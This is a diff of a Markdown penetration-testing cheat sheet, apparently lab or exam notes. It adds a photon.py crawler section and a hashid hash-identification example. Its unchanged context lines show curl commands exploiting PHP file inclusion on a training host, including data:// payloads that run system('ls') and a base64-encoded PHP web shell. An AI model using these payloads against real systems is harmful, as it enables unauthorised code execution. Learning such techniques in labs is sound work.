@@ -15,6 +15,7 @@
 * [WINRM - 5985 - 5986](#WINRM---5985---5986)
 * [Fuzzing](#Fuzzing)
 * [Password crack](#password-crack)
+  * [Hash identifier](#Hash-identifier)
   * [John](#john)
   * [Hashcat](#hashcat)
 * [SQL Injection](#SQL-Injection)
@@ -121,6 +122,19 @@ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base
 curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
 curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
 ~~~
+
+
+# Crawler
+
+~~~ bash
+photon.py -u http://<RHOST> -l 3 -t 10 -v
+~~~
+
+```-u```, ```--url```: root url
+```-t```, ```--threads```: number of threads
+```-l```, ```--level``` : levels to crawl(default: 2)
+```-v```, ```--verbose``` : verbose output
+
 
 # SNMP - 161
 
@@ -349,6 +363,13 @@ ffuf -u http://target.com/ -w ./fuzzDicts/subdomainDicts/main.txt -H "Host:FUZZ.
 
 
 # Password crack
+
+## Hash identifier
+
+~~~ bash
+hashid '$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0'
+~~~
+
 
 ## John
 
